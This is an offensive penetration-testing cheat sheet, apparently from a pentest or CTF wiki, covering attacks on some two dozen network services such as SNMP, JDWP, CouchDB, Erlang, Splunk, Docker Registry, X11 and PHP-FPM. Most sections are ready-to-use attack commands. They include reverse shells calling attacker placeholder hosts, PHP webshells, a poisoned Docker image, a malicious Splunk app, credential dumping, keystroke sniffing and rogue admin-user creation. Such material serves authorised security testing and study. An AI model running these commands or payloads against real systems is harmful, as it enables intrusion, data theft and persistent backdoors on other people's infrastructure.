-- Write a text file (one-liner only; COPY cannot emit newlines or clean binary)
COPY (SELECT convert_from(decode('<BASE64>','base64'),'utf-8')) TO '/var/www/html/shell.php';

-- Binary file move via large objects
SELECT lo_import('/etc/passwd', 13337);
SELECT lo_export(13338, '/var/lib/postgresql/13/main/base/3/1337');
```

---

## VNC 5900 no-auth access and stored password decryption

VNC (ports 5800/5801/5900/5901) may allow connection with no authentication, or use a
weak fixed-key 3DES scheme for the stored password in `~/.vnc/passwd`. That 3DES key was
reversed years ago, so any recovered `passwd` blob is trivially decryptable.

```bash
# Enumerate + check for no-auth / RealVNC auth-bypass
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p 5900 <IP>
msf> use auxiliary/scanner/vnc/vnc_none_auth

# Connect (Kali)
vncviewer <IP>::5900
vncviewer -passwd passwd.txt <IP>::5901

# Decrypt a captured ~/.vnc/passwd (fixed-key 3DES; https://github.com/jeroennijhof/vncpwd)
make && ./vncpwd <passwd_file>
```

---

## SSH 22 username enumeration and credential brute force

Some OpenSSH versions leak valid usernames via a timing side channel (CVE-2018-15473).
After building a user list, spray default/common SSH creds (vendor tables in
wiki/cheatsheets/default-credentials.md). Check offered auth methods first to know
whether password auth is even enabled.

```bash
# Auth methods + host keys
nmap -p22 <IP> --script ssh-auth-methods --script-args="ssh.user=root"
ssh -v <user>@<IP> -o PreferredAuthentications=password

# Username enumeration (timing, CVE-2018-15473)
msf> use scanner/ssh/ssh_enumusers

# Brute force / spray
hydra -L users.txt -P passwords.txt ssh://<IP> -t 4 -f
# vendor default SSH creds wordlist: SecLists ssh-betterdefaultpasslist.txt
```

---

## SSH 22 private-key attacks (weak Debian PRNG, known keys)

If password auth is off, key auth may still be brute-forceable. Keys generated on
Debian/Ubuntu systems with the 2006-2008 predictable-PRNG bug come from a tiny keyspace
and are pre-computed. Known deployed/backdoor keys are catalogued in ssh-badkeys. You
can also test whether a set of candidate public keys is accepted before you hold the
private key.

```bash
# Test which candidate pubkeys the server will accept (no private key needed)
nmap -p22 --script ssh-publickey-acceptance --script-args \
  "publickeys={'./id_rsa1.pub','./id_rsa2.pub'}" <IP>
msf> use scanner/ssh/ssh_identify_pubkeys

# Weak Debian PRNG precomputed keys: https://github.com/g0tmi1k/debian-ssh
# Known bad/backdoor keys:            https://github.com/rapid7/ssh-badkeys
# Brute a private key against the host (legacy algs enabled): snowdroppe/ssh-keybrute

# Crack a passphrase-protected private key you already recovered
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

---

## SSH 22 Kerberos/GSSAPI single sign-on abuse

When an SSH server supports GSSAPI (for example Windows OpenSSH on a domain controller),
a Kerberos TGT authenticates without a password. Use a stolen/obtained TGT and connect
with the FQDN that matches the host SPN, otherwise you get "Server not found in Kerberos
database".

```bash
sudo ntpdate <dc.fqdn>                 # avoid KRB_AP_ERR_SKEW
kinit <user>                           # obtain a TGT (or import a ccache)
klist
ssh -o GSSAPIAuthentication=yes <user>@<host.fqdn>
# crackmapexec ssh --kerberos can also use the ccache
```

---

## SNMP 161 RCE via NET-SNMP-EXTEND-MIB (write community)

A read-write community string (`rwcommunity`) on a Net-SNMP agent lets you append rows to
the `nsExtendObjects` table with `snmpset`. The agent executes the referenced binary on
read ("run-on-read"), returning stdout in `nsExtendOutputFull`. This is direct command
execution as the snmpd user (often root).

```bash
# Triage existing extend entries and read-back capability
snmpwalk -v2c -c <COMMUNITY> <IP> NET-SNMP-EXTEND-MIB::nsExtendObjects
# (numeric OID fallback if MIBs missing: 1.3.6.1.4.1.8072.1.3.2)

# Inject a command (run /bin/sh -c <payload>) then read output
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c <COMMUNITY> <IP> \
 'nsExtendStatus."x"'  = createAndGo \
 'nsExtendCommand."x"' = /bin/sh \
 'nsExtendArgs."x"'    = '-c id'
snmpget -v2c -c <COMMUNITY> <IP> 'NET-SNMP-EXTEND-MIB::nsExtendOutputFull."x"'

# Reverse shell payload
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c <COMMUNITY> <IP> \
 'nsExtendStatus."r"'  = createAndGo \
 'nsExtendCommand."r"' = /bin/sh \
 'nsExtendArgs."r"'    = '-c "bash -i >& /dev/tcp/<LHOST>/443 0>&1"'
snmpwalk -v2c -c <COMMUNITY> <IP> NET-SNMP-EXTEND-MIB::nsExtendObjects
```

---

## Rsync 873 anonymous module read/write and authorized_keys upload

Rsync daemon modules are directory shares that may be unauthenticated. List modules, then
read or (crucially) write files. If a module maps to a user home with write access, upload
an `authorized_keys` for SSH. `AUTHREQD` in the banner means that module needs a password.

```bash
# Enumerate modules (raw or tooling)
nc -vn <IP> 873          # then send: @RSYNCD: 31.0  and  #list
nmap -sV --script rsync-list-modules -p 873 <IP>

# Anonymous list / download
rsync -av --list-only rsync://<IP>/<module>
rsync -av rsync://<IP>:873/<module> ./loot

# Authenticated (prompts for password)
rsync -av --list-only rsync://<user>@<IP>/<module>

# Upload an authorized_keys for SSH access (writable home module)
rsync -av ./ssh/ rsync://<user>@<IP>/home_user/.ssh
```

Post-access, the module secrets live in `rsyncd.conf`/`rsyncd.secrets`:
`find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)`.

---

## Java RMI enumeration and RCE (1090/1098/1099/1199/4443-4446/8999-9010)

Java RMI is an object-oriented RPC where a JVM exposes remote objects on a TCP port.
The RMI Registry (ObjID 0), Activation System (ObjID 1) and Distributed Garbage
Collector (ObjID 2) are the fixed default components; custom application objects bind
to random high ports. nmap often labels these `java-rmi` or `ssl/java-rmi`; treat any
unknown SSL service on a common RMI port as a candidate. The primary tool is
remote-method-guesser (`rmg`), which fingerprints known RMI vulnerabilities in one shot.

```bash
# Enumerate bound names, codebase, deserialization filter status, CVE-2019-2684, JEP290 bypass
rmg enum <IP> 9010

# ObjID gives service uptime (useful for version-dating the JVM)
rmg objid '[55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]'
```

RMI does not let you list methods on custom objects; you must brute-force valid
signatures. Custom services usually lack the deserialization filters that protect the
default components, so a guessed method is often a direct deserialization sink.

```bash
# Guess method signatures against every bound name (uses internal + rmiscout wordlists)
rmg guess <IP> 9010

# Call a guessed method directly (here a String execute(String) returning command output)
rmg call <IP> 9010 '"id"' --bound-name plain-server \
    --signature "String execute(String dummy)" --plugin GenericPrint.jar

# Deserialization RCE against a guessed non-primitive-arg method (ysoserial gadget)
rmg serial <IP> 9010 CommonsCollections6 'nc <ATTACKER> 4444 -e /bin/sh' \
    --bound-name plain-server --signature "String execute(String dummy)"
```

If a bound name resolves to `javax.management.remote.rmi.RMIServerImpl_Stub` you have a
JMX endpoint: use beanshooter to abuse the MLet MBean (load a remote MBean = RCE) or the
post-newClient deserialization path. Also grep GitHub for the interface/impl class name;
the bound name plus class name frequently leaks the exact method set. Alternatives:
rmiscout (BishopFox), BaRMIe (NickstaDB).

---

## JDWP remote code execution (Java Debug Wire Protocol, commonly 8000)

JDWP is the unauthenticated, unencrypted debug transport a JVM exposes when started
with `-agentlib:jdwp` / `-Xdebug -Xrunjdwp`. Anyone who can reach the port can load
classes, set breakpoints, and invoke arbitrary methods, so exposure equals RCE on any
JDK version. Fingerprint by sending the 14-byte handshake and expecting it echoed back.

```bash
# Handshake probe: service echoes "JDWP-Handshake" if present
printf 'JDWP-Handshake' | nc -vn <IP> 8000

# nmap confirmation
nmap -sV --script jdwp-info,jdwp-exec -p 8000 <IP>
```

Exploit with jdwp-shellifier (IOActive). It fetches a Runtime reference, arms a
breakpoint that normal traffic will hit, then invokes `Runtime.exec` when the breakpoint
fires. Breaking on `java.lang.String.indexOf` is far more stable than the default
`ServerSocket.accept` because ordinary app activity triggers it quickly.

```bash
python2 jdwp-shellifier.py -t <IP> -p 8000                       # dump JVM/system info only
python2 jdwp-shellifier.py -t <IP> -p 8000 --break-on 'java.lang.String.indexOf' \
    --cmd 'ncat -l -p 1337 -e /bin/bash'
```

For maximum reliability, drop a real backdoor binary to the host and have the JDWP exec
launch it rather than running a one-shot inline command.

---

## CouchDB privilege escalation and RCE (5984/6984)

CouchDB is a document DB with a pure-HTTP REST API. Unauthenticated instances expose the
full data set; even authenticated ones fall to a classic JSON-parser-differential admin
bypass. Enumerate over curl before anything else.

```bash
curl http://<IP>:5984/                       # banner + version, e.g. {"couchdb":"Welcome","version":"2.0.0"}
curl http://<IP>:5984/_all_dbs               # list databases (401 => need creds)
curl http://<IP>:5984/_membership            # cluster node names (needed for the RCE path below)
curl http://<IP>:5984/<db>/_all_docs         # list docs in a db
curl http://<IP>:5984/<db>/<docid>           # read a doc (creds often live here)
```

CVE-2017-12635 (Erlang vs JavaScript JSON parser differential): sending a user document
with two `roles` keys makes the validation layer see the empty one while the storage
layer keeps `["_admin"]`, creating an admin account with no prior auth.

```bash
curl -X PUT -H "Content-Type:application/json" \
  -d '{"type":"user","name":"pwn","roles":["_admin"],"roles":[],"password":"pwn"}' \
  http://<IP>:5984/_users/org.couchdb.user:pwn
```

CVE-2017-12636 (config-driven RCE): once admin, register an OS command as a query server
(v2 uses the per-node `_config` path), then trigger it via a design-doc view. Requires a
writable `local.ini` on the node.

```bash
# Register a malicious query "language" mapped to a shell command
curl -X PUT 'http://pwn:pwn@<IP>:5984/_node/couchdb@localhost/_config/query_servers/cmd' \
  -d '"/bin/bash -c '\''bash -i >& /dev/tcp/<ATTACKER>/9001 0>&1'\''"'
# Create a db, a doc, and a design doc whose language is our command
curl -X PUT 'http://pwn:pwn@<IP>:5984/df'
curl -X PUT 'http://pwn:pwn@<IP>:5984/df/zero' -d '{"_id":"HTP"}'
curl -X PUT 'http://pwn:pwn@<IP>:5984/df/_design/z' \
  -d '{"_id":"_design/z","views":{"a":{"map":""}},"language":"cmd"}'
```

CVE-2018-8007 is an alternative RCE by injecting `[os_daemons]` into `local.ini` via the
`cors/origins` config and restarting the process. Because CouchDB runs on the Erlang VM,
the strongest local privesc is often the Erlang cookie path (see next section): the HTB
Canape chain goes CVE-2017-12635 admin, then reads `~/.erlang.cookie`, then `rpc:call`
into the couchdb node as its OS user.

---

## Erlang Port Mapper Daemon and cookie RCE (4369, plus EPMD-mapped ports)

EPMD maps Erlang node names to their dynamic distribution ports. It fronts RabbitMQ,
CouchDB, Kazoo/FreeSWITCH and any distributed-Erlang app. Enumeration reveals the live
nodes and their real ports; the actual compromise hinges on the shared authentication
"cookie" (`~/.erlang.cookie`, a 20-char A-Z string by default). Any node holding the
cookie can execute code on every other node in the cluster.

```bash
# Manual node-name request over the EPMD protocol
echo -n -e "\x00\x01\x6e" | nc -vn <IP> 4369

# nmap dumps every registered node and its distribution port
nmap -sV -Pn -n -p 4369 --script epmd-info <IP>
```

With a leaked or brute-forced cookie, open a remote Erlang shell and run OS commands:

```bash
# Remote shell into a discovered node
erl -cookie <LEAKED_COOKIE> -name pwn@<ATTACKER> -remsh <nodename>@<target.fqdn>
# then in the Eshell:
> os:cmd("id").

# Local privesc variant (foothold user pivots into a root-owned node, e.g. couchdb)
HOME=/ erl -sname anon -setcookie <LEAKED_COOKIE>
> rpc:call('couchdb@localhost', os, cmd, ["bash -c 'bash -i >& /dev/tcp/<ATTACKER>/9005 0>&1'"]).
```

Metasploit `exploit/multi/misc/erlang_cookie_rce` automates the remote path if you have
the cookie. Weak/default cookies are brute-forceable (epmd_bf).

---

## Elasticsearch unauthenticated dump and user enumeration (9200)

Elasticsearch defaults to NO authentication, so a bare instance leaks every index over
HTTP. Distinguish the three states: `/` returns cluster JSON (open), a `500` about
`xpack.security.enabled` (open, security never turned on), or a `401` with
`WWW-Authenticate: Basic` (auth on, brute-force it). Default users to try:
`elastic` (superuser, old default password `changeme`), `kibana`, `logstash_system`,
`beats_system`, `remote_monitoring_user`.

```bash
curl http://<IP>:9200/                                # banner / cluster info
curl http://<IP>:9200/_cat/indices?v                  # every index, doc count, size
curl "http://<IP>:9200/_security/user"                # enumerate users (if security on + authed)
curl "http://<IP>:9200/_security/role"                # roles; look for superuser
```

Dumping data: `_search` caps at 10 rows by default, so pass `size` to pull everything an
index reports in its `hits.total`. The `q` search parameter supports regex.

```bash
curl "http://<IP>:9200/<index>/_search?pretty=true&size=1000"       # dump a full index
curl "http://<IP>:9200/_search?pretty=true"                        # dump across all indices
curl "http://<IP>:9200/_search?pretty=true&q=password"             # keyword hunt across indices
# Write test (open cluster => you can create indices; sometimes a foothold for scripted fields)
curl -X POST http://<IP>:9200/pwn/doc -H 'Content-Type: application/json' -d '{"x":"y"}'
```

Automate with `msf auxiliary/scanner/elasticsearch/indices_enum` or the
nmap-elasticsearch-nse script.

---

## Kibana access to Elasticsearch and pre-6.6 RCE (5601)

Kibana authentication is inherited entirely from Elasticsearch: if ES has security off,
Kibana is open; if creds exist they sit in `/etc/kibana/kibana.yml`. Creds that are NOT
the restricted `kibana_system` account usually grant broad ES access (data plus
Stack Management for users, roles and API keys). Once in, prioritise reading ES data and
minting an API key or superuser.

```bash
# Fingerprint + version (version drives the CVE choice)
curl -s http://<IP>:5601/api/status | grep -o '"number":"[0-9.]*"'
# Grab creds from a foothold
cat /etc/kibana/kibana.yml | grep -Ei 'username|password|elasticsearch.hosts'
```

Kibana before 6.6.0 has a Timelion prototype-pollution to RCE (CVE-2019-7609): a crafted
`.es(*)` expression pollutes a Node.js prototype so a canvas/console request spawns a
child process. Also CVE-2018-17246 (LFI-to-RCE via the Console plugin loading an
attacker JS file). Both need network reach to 5601 and a matching version; confirm the
version first, then run the public PoC for that CVE with an OOB-verified reverse shell.

---

## Splunk custom-app RCE (management port 8089, web 8000)

Splunk exposes its web UI on 8000 and the splunkd management API on 8089. Two recurring
weaknesses: the trial converts to a free tier after 60 days and the free tier has NO
authentication, and older builds ship `admin:changeme`. A Splunk app can run Python,
Bash, Batch or PowerShell, and Splunk bundles its own Python, so scripted inputs give
cross-platform RCE (works even on Windows targets with no interpreter installed).

```bash
# Fingerprint / confirm creds against the mgmt API
curl -k https://<IP>:8089/services/server/info -u admin:changeme
```

Package a malicious app: a `bin/` with the reverse-shell script and a `default/inputs.conf`
that enables it (`disabled = 0`, a short `interval`, and a `sourcetype`), then upload it
via the app-management UI. Splunk runs the scripted input on the interval automatically.

```ini
# default/inputs.conf
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell
```

```python
# bin/rev.py  (Linux; Splunk's own python runs it)
import socket,os,pty
s=socket.socket(); s.connect(("<ATTACKER>",443))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")
```

Start a listener, upload the app, catch the shell. On Windows use an equivalent
`run.ps1` TCPClient reverse shell. Reference package: 0xjpuff/reverse_shell_splunk. The
same primitive gives persistence and, where splunkd runs as SYSTEM/root, local privesc.

---

## Docker Registry enumeration, image loot and backdoor (5000)

A Docker Registry (Distribution API 2.0) on 5000 is HTTP(S) and often behind a proxy, so
nmap can miss it; fingerprint by hand. `/` returns nothing, `/v2/` returns `{}`,
`/v2/_catalog` lists repositories or a 401. Pulling images gives you their layers, and
layers routinely contain hardcoded secrets, source, and config.

```bash
curl -s http://<IP>:5000/v2/_catalog                       # list repos (add -k -u user:pass if auth'd)
curl -s http://<IP>:5000/v2/<repo>/tags/list               # tags for a repo
curl -s http://<IP>:5000/v2/<repo>/manifests/latest        # manifest -> blobSum layer digests
curl http://<IP>:5000/v2/<repo>/blobs/sha256:<digest> --output blob.tar
tar -xf blob.tar    # inspect each blob in its OWN dir; blobs overwrite each other otherwise
```

Automate the dump with DockerRegistryGrabber (`drg.py <url> --dump_all`). If you have a
Docker client, pull and mine the history for the build commands (which leak paths and
sometimes creds):

```bash
docker pull <IP>:5000/<repo>
docker history <IP>:5000/<repo>            # reveals COPY/RUN commands, e.g. cp mysql-setup.sh
docker run -it <IP>:5000/<repo> bash
```

Write access lets you poison images: rebuild a pulled image with a webshell or
`PermitRootLogin yes` + a known root password, then `docker push` it back so the next
deploy runs your backdoor.

```dockerfile
FROM <IP>:5000/wordpress
COPY shell.php /app/
RUN chmod 777 /app/shell.php     # shell.php: <?php echo shell_exec($_GET["cmd"]); ?>
```

---

## IPsec/IKE aggressive-mode PSK capture and cracking (500/udp, 4500/udp)

Enterprise IPsec VPNs negotiate keys via IKE over 500/udp (4500/udp for NAT-T). The
high-value bug is IKE aggressive mode with a pre-shared key: the group ID travels in the
clear and the gateway returns a PSK-derived hash that is crackable offline. First find a
transform the gateway accepts, then a valid group name, then grab and crack the hash.

```bash
nmap -sU -p 500 <IP>                                  # confirm isakmp open
ike-scan -M <IP>                                      # "1 returned handshake" => transform accepted; note Auth=PSK

# If no transform is accepted, brute-force the 8-value transform space
for E in 1 5 7/256; do for H in 1 2; do for A in 1 65001; do for G in 2 14; do
  ike-scan -M --trans=$E,$H,$A,$G <IP> | grep -B14 "1 returned handshake"; done;done;done;done
```

Aggressive mode leaks the identity pre-auth and yields a crackable PSK handshake:

```bash
ike-scan -A <IP>                                      # leaks ID(Type=..., Value=ike@corp.tld) pre-auth
ike-scan -A --pskcrack=handshake.txt <IP>             # capture the crackable PSK hash
hashcat -m 5400 handshake.txt wordlist.txt            # or psk-crack / john via ikescan2john.py
```

Brute-force the group ID with the ike-scan loop when it is unknown (SecLists
`Miscellaneous/ike-groupid.txt`), or use ikeforce. Recovered PSKs are frequently reused
as SSH/service passwords, so spray them. If XAUTH is enabled after the PSK, brute-force
user/pass with `ikeforce.py <IP> -b -i <group> -u <user> -k <PSK> -w pass.txt`, then
connect with vpnc.

---

## Network-printer raw PJL abuse: file read, upload and cred theft (9100)

Raw port 9100 (JetDirect/AppSocket/PDL) feeds bytes straight to the print engine, giving
a bidirectional channel to the PJL/PostScript/PCL interpreter. That interpreter exposes a
filesystem: you can list, read and write files on the printer, often reaching stored SMB/
LDAP/email credentials, address books and spooled documents. Interact by hand over nc,
then switch to PRET for a real shell.

```bash
nc -vn <IP> 9100
@PJL INFO ID                       # brand + firmware version
@PJL INFO VARIABLES                # env variables (may include configured creds)
@PJL FSDIRLIST NAME="0:\" ENTRY=1 COUNT=65535   # list the printer filesystem
@PJL FSUPLOAD NAME="0:\..\..\etc\passwd"        # read a file off the device
```

PRET (RUB-NDS) wraps these into `ls`, `get`, `put`, `cat` plus path-traversal and NVRAM
tricks; Metasploit has `auxiliary/scanner/printer/printer_list_dir`,
`printer_download_file`, `printer_env_vars`. nmap: `--script pjl-ready-message`.

```bash
python pret.py <IP> pjl
> ls /
> get ../../etc/passwd
> nvram dump          # some models leak stored credentials from NVRAM
```

Advanced: PJL can switch languages (`@PJL ENTER LANGUAGE = XPS`) and some engines
(e.g. Canon ImageCLASS) have a memory-unsafe TrueType hinting VM reachable by shipping a
malicious font inside an XPS job over 9100, a path to firmware RCE.

---

## RTSP camera stream access and credential brute force (554, 8554)

RTSP is an HTTP-like control protocol for IP cameras and media servers. A `DESCRIBE`
request tells you the auth state: `200 OK` is unauthenticated access, `401` reveals Basic
or Digest auth. The stream path (`/live.sdp`, `/mpeg4`, vendor-specific) must be guessed
or brute-forced; once you have path plus creds, view the feed directly.

```bash
# Manual DESCRIBE probe (double CRLF required)
printf 'DESCRIBE rtsp://<IP>:554 RTSP/1.0\r\nCSeq: 2\r\n\r\n' | nc <IP> 554

nmap -sV --script "rtsp-*" -p 554 <IP>              # methods, URL discovery, brute

# View a discovered stream (TCP transport is more reliable than UDP)
ffplay -rtsp_transport tcp rtsp://<IP>/live.sdp
```

Cameradar (Ullaakut) automates the whole chain: discover RTSP hosts, dictionary-attack
both the stream route and the camera credentials, and generate thumbnails to confirm live
feeds. rtsp_authgrinder is a lighter cred brute-forcer.

```bash
cameradar -t <IP>                                   # route + credential dictionary attack
```

For P2P/cloud cameras that do not expose 554 directly, pivot to the PPPP protocol
(32100/udp).

---

## X11 unauthenticated display abuse: keylog, screenshot, input injection (6000)

An open X11 server (TCP 6000 + display number) or a reachable MIT-MAGIC-COOKIE lets an
attacker do far more than draw windows: enumerate clients, read the clipboard, screenshot
the desktop, sniff keystrokes and inject input. From a local foothold, the cookie lives
in `~/.Xauthority` (or the path in `$XAUTHORITY`, or the Xorg `-auth` argument).

```bash
nmap -sV --script x11-access -p 6000 <IP>           # test anonymous connect
# Local: locate the cookie of a running GUI session
xauth list; ps -efww | grep -E '[X]org|[X]wayland'
export XAUTHORITY=/home/<user>/.Xauthority          # then target <host>:0
```

Post-connection primitives:

```bash
xwininfo -root -tree -display <IP>:0                 # enumerate windows
xwd -root -screen -silent -display <IP>:0 > shot.xwd && convert shot.xwd shot.png   # screenshot
xspy <IP>                                            # sniff keystrokes (creds typed live)
xclip -display <IP>:0 -selection clipboard -o        # steal clipboard (tokens, pasted keys)
# Input injection -> command execution: activate a window, then type
WID=$(xdotool search --onlyvisible --name '.*' | head -n1)
xdotool windowactivate --sync "$WID"; xdotool type 'xterm &'; xdotool key Return
```

`msf exploit/unix/x11/x11_keyboard_exec` weaponises the injection into a shell; xpra can
shadow the whole display live. Activating the target window before typing beats
`--window` XSendEvent, which many apps ignore.

---

## RabbitMQ Management console abuse (15672)

When the management plugin is enabled, RabbitMQ exposes a web console/API on 15672 with
default credentials `guest:guest`. Authenticated access leaks connection metadata and,
more usefully, lets you publish arbitrary messages into queues, which can drive downstream
consumers to perform actions (send mail, attach files, trigger jobs) in a CTF/logic sense.

```bash
# Default login check
curl -s -u guest:guest http://<IP>:15672/api/overview
curl -s -u guest:guest http://<IP>:15672/api/connections     # peers + client props

# Publish a message into a queue via the API (consumer-side impact)
curl -u guest:guest -H "Content-Type: application/json" \
  -X POST http://<IP>:15672/api/exchanges/%2F/amq.default/publish \
  -d '{"vhost":"/","name":"amq.default","properties":{"delivery_mode":1},
       "routing_key":"email","payload":"{\"to\":\"a@b.c\",\"attachments\":[{\"path\":\"/flag.txt\"}]}",
       "payload_encoding":"string"}'
```

Erlang cookie hash from `rabbitmq.conf`/mnesia can be recovered and cracked
(hashcat mode 1420 with `--hex-salt` after re-ordering the salt). RabbitMQ also runs on
the Erlang VM, so 4369/EPMD + a leaked `~/.erlang.cookie` gives the same distributed-Erlang
RCE path as CouchDB.

---

## Cisco Smart Install config exfiltration and RCE (4786)

Cisco Smart Install automates zero-touch provisioning of new switches and is ON by
default on many Catalyst devices, listening on TCP 4786. It requires no authentication:
a crafted packet can force the switch to hand over its running configuration (which
carries SNMP strings, VTY passwords, VLAN and routing detail) or, via CVE-2018-0171, a
buffer overflow enabling reboot or RCE. Config exfiltration alone maps the internal
network and yields creds for further attacks.

```bash
nmap -p 4786 --script smart-install <IP>            # detect Smart Install
# SIET (frostbits-security): -g grabs the config, -i sets the target; output lands in tftp/
python2 siet.py -g -i <IP>
```

Treat any exposed 4786 as a full config leak; grep the exfiltrated file for
`snmp-server community`, `enable secret`, `username ... password` and reuse those against
the rest of the estate.

---

## FastCGI / PHP-FPM direct RCE (9000)

PHP-FPM speaks FastCGI on 9000 and is usually bound to localhost, so you reach it after a
foothold or through an SSRF/gopher primitive; nmap tags it "unknown". If you can send
FastCGI records you get RCE, because you control the CGI params: point `SCRIPT_FILENAME`
at any existing `.php` on disk and use `PHP_VALUE` to set `auto_prepend_file` +
`allow_url_include`, injecting your payload before the real script runs.

```bash
# Probe the default status endpoint
SCRIPT_NAME=/status SCRIPT_FILENAME=/status REQUEST_METHOD=GET \
  cgi-fcgi -bind -connect 127.0.0.1:9000

# Direct RCE: prepend a data:// payload to an existing php file
env -i \
  PHP_VALUE="allow_url_include=1"$'\n'"auto_prepend_file='data://text/plain;base64,$(echo "<?php system(\$_GET['c']); ?>"|base64)'" \
  SCRIPT_FILENAME=/var/www/html/index.php SCRIPT_NAME=/index.php REQUEST_METHOD=GET \
  cgi-fcgi -bind -connect 127.0.0.1:9000
```

When only SSRF is available, build a raw FastCGI record stream (FCGI_PARAMS with
`auto_prepend_file=php://input`, then FCGI_STDIN carrying `<?php system('id'); ?>`) and
deliver it as `gopher://127.0.0.1:9000/_<url-encoded-bytes>`. Gopherus generates these.
Watch for the Nginx `cgi.fix_pathinfo=1` misconfig, which lets you append `/x.php` to a
static upload and reach PHP without touching 9000 directly.

---


## Oracle TNS Listener enumeration and DB code execution (port 1521)

Oracle DB fronts its RDBMS with the TNS Listener, usually on 1521/TCP (secondary listeners land on 1522-1529). The listener leaks version, can be brute-forced for the SID (database name), and once you have a SID plus valid creds the DB itself gives file read/write and OS command execution. `odat` (Oracle Database Attacking Tool) automates the whole chain; `tnscmd10g` and nmap NSE do the light-touch banner and version work.

### Enumeration
```bash
# Version + listener status (no creds)
nmap -p1521 -sV --script "oracle-tns-version,oracle-sid-brute" <IP>
tnscmd10g version -h <IP>
tnscmd10g status  -h <IP>

# odat one-shot: runs every enum + attack module against the listener
odat all -s <IP> -p 1521

# SID brute (database name is required to auth)
odat sidguesser -s <IP> -p 1521
odat tnscmd -s <IP> --version           # ask the listener directly

# Credential brute once a SID is known
odat passwordguesser -s <IP> -p 1521 -d <SID> --accounts-file accounts_multiple.txt
```

### Exploitation / Attacks
```bash
# With a valid SID + creds, sqlplus gives a direct shell into the DB
sqlplus <user>/<pass>@<IP>:1521/<SID>

# Arbitrary file READ from the DB host (UTL_FILE / external tables)
odat utlfile   -s <IP> -d <SID> -U <user> -P <pass> --getFile /path ./local
odat externaltable -s <IP> -d <SID> -U <user> -P <pass> --getFile /etc /etc/passwd out

# Arbitrary file WRITE (drop a webshell into a served dir)
odat utlfile   -s <IP> -d <SID> -U <user> -P <pass> --putFile /var/www/html sh.jsp ./sh.jsp

# OS command execution via DBMS_SCHEDULER / Java / external table
odat dbmsscheduler -s <IP> -d <SID> -U <user> -P <pass> --exec "/bin/bash -c 'id'"
odat externaltable -s <IP> -d <SID> -U <user> -P <pass> --exec /tmp cmd.sh
```

### Notable CVEs
- CVE-2012-1675 (TNS Listener Poison / "TNS Poison"): pre-12c listeners let a remote unauthenticated attacker register a rogue instance and MITM/hijack DB sessions. `odat` and the msf `tnspoison` module test it.

---

## Cassandra unauthenticated enumeration and credential-hash dump (port 9042)

Apache Cassandra is a distributed NoSQL store on 9042 (native protocol) and legacy 9160 (Thrift). It very often ships with authentication disabled or accepting any credentials, so an unauthenticated CQL session can enumerate keyspaces and read the `system_auth` tables that hold role credential hashes.

### Enumeration
```bash
# nmap gathers little beyond version
nmap -sV --script cassandra-info -p 9042 <IP>

# cqlsh is the native client (pip install cqlsh); no/any creds often accepted
cqlsh <IP> 9042
cqlsh <IP> 9042 -u cassandra -p cassandra   # default super-user cassandra:cassandra
```

### Exploitation / Attacks
```sql
-- Cluster + version fingerprint
SELECT cluster_name, release_version, native_protocol_version, data_center FROM system.local;

-- Enumerate keyspaces, then describe the one you want
SELECT keyspace_name FROM system_schema.keyspaces;
DESC system_auth;

-- Dump role rows: system_auth.roles holds bcrypt hashes of every DB role
SELECT * FROM system_auth.roles;
SELECT * FROM system_auth.role_permissions;

-- Application keyspaces frequently hold app creds / tokens
SELECT * FROM logdb.user_auth;
SELECT * FROM configuration."config";
```
Crack the recovered bcrypt hashes offline with hashcat (`-m 3200`) and reuse against the cluster or other services.

---

## InfluxDB unauthenticated time-series dump and auth bypass (port 8086)

InfluxDB is a time-series DB serving its HTTP API on 8086. Legacy 1.x instances frequently run with auth disabled, so `/query` and `/write` are open for reading, dumping, or even creating admin users. 2.x uses token auth; a leaked token gives full org/bucket enumeration.

### Enumeration
```bash
# Version fingerprint (v1 vs v2)
curl -si http://<IP>:8086/ping        # v1: 204 + X-Influxdb-Version header
curl -s  http://<IP>:8086/health | jq # v2: JSON version + status, no auth needed

# v1 CLI shell (unauth attempt)
influx -host <IP> -port 8086

# msf enum module
msf6 > use auxiliary/scanner/http/influxdb_enum
```

### Exploitation / Attacks
```bash
# v1 unauth data dump over HTTP API (InfluxQL)
curl -sG "http://<IP>:8086/query" --data-urlencode "q=SHOW DATABASES"
curl -sG "http://<IP>:8086/query" --data-urlencode "q=SHOW USERS"
curl -sG "http://<IP>:8086/query" --data-urlencode "db=telegraf" --data-urlencode "q=SHOW MEASUREMENTS"
curl -sG "http://<IP>:8086/query" --data-urlencode "db=telegraf" --data-urlencode 'q=SELECT * FROM "cpu" LIMIT 5' | jq .
# (table names sometimes must be double-quoted: SELECT * FROM "cpu")

# If auth is disabled, create your own admin user
curl -sG "http://<IP>:8086/query" --data-urlencode "q=CREATE USER hacker WITH PASSWORD 'P@ssw0rd!' WITH ALL PRIVILEGES"

# v2 with a stolen token: enumerate orgs/buckets and query with Flux
TOKEN="<token>"
curl -s -H "Authorization: Token $TOKEN" http://<IP>:8086/api/v2/organizations | jq .
curl -s -H "Authorization: Token $TOKEN" 'http://<IP>:8086/api/v2/buckets?limit=100' | jq .
curl -s -H "Authorization: Token $TOKEN" -H 'Content-Type: application/vnd.flux' -X POST \
  http://<IP>:8086/api/v2/query --data 'from(bucket:"telegraf") |> range(start:-1h) |> limit(n:5)'
```

### Notable CVEs
- CVE-2019-20933: InfluxDB 1.x (< 1.7.6) JWT authentication bypass when the shared secret is empty; a forged token grants full admin. PoC: `LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933`.
- CVE-2024-30896: InfluxDB OSS 2.x through 2.7.11 operator-token exposure; a low-priv token in the default org can list `/api/v2/authorizations` and recover the instance-wide operator token, then admin everything.

---

## AWS Redshift Postgres-wire warehouse attack (port 5439)

Amazon Redshift is a managed data warehouse speaking a lightly modified PostgreSQL wire protocol on 5439, so Postgres tooling (psql, psycopg2, JDBC/ODBC) works; see the Postgres notes for generic wire behaviour. Redshift-specific gotchas are TLS enforcement, IAM auth, and driver metadata SQLi. Keep this short: enumeration/SQL is Postgres-identical.

### Enumeration
```bash
# TLS is usually required; force sslmode=require
psql "host=<endpoint> port=5439 user=awsuser dbname=dev sslmode=require" -c 'select version();'
